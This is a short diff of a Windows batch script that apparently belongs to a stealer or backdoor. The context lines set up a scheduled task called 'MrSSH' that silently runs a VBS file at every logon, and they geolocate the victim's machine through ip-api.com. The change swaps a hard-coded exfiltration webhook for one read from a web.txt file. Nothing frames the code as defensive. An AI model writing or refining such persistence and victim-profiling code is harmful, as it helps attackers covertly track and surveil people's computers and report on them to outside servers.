@@ -25,7 +25,7 @@ schtasks /create /tn "MrSSH" /sc onlogon /tr "%appdata%\MrSSH\Silent.vbs" /F
 cd %temp%
 :: </Startup>
 
-set "webhook="
+FOR /F "tokens=* USEBACKQ" %F IN (`type web.txt`) DO (SET webhook=%F)
 
 for /f "tokens=*" %%a in ('call "WebParse.exe" "http://ip-api.com/json/?fields=61439" query status city regionName country countryCode lat lon timezone isp') do set "%%a"
 
